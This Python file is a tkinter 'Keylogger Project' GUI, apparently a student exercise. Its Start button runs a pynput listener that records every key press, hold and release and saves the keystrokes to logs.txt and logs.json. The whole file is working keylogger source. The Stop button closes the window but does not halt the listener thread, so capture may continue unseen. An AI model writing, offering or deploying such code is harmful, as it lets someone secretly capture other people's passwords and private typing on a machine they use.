import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading
#pr new adarsh
root = tk.Tk()
root.geometry("400x200")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'a') as log_file:
        log_file.write(key + "\n")

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
        if x == True:
            key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
        update_json_file(key_list)
        key_strokes = key_strokes + str(key) + "\n"
        update_txt_file(str(key_strokes))

def start_keylogger():
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    print("[+] Keylogger Stopped Successfully!")
    root.destroy()

def run_keylogger():
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

root.columnconfigure(0, weight=1)
root.columnconfigure(1, weight=1)

empty = Label(root, text="Keylogger Project", font='verdana 11 bold')
empty.grid(row=0, column=0, columnspan=2)

text_area = Text(root, wrap='word', height=5, width=40)
text_area.grid(row=1, column=0, columnspan=2)

start_button = Button(root, text="Start Keylogger", command=run_keylogger)
start_button.grid(row=2, column=0, pady=10, sticky="ew")

stop_button = Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.grid(row=2, column=1, pady=10, sticky="ew")

copyright_label = Label(root, text="All rights reserved by Adarsh Sinha")
copyright_label.grid(row=3, column=0, columnspan=2, pady=5)

root.mainloop()
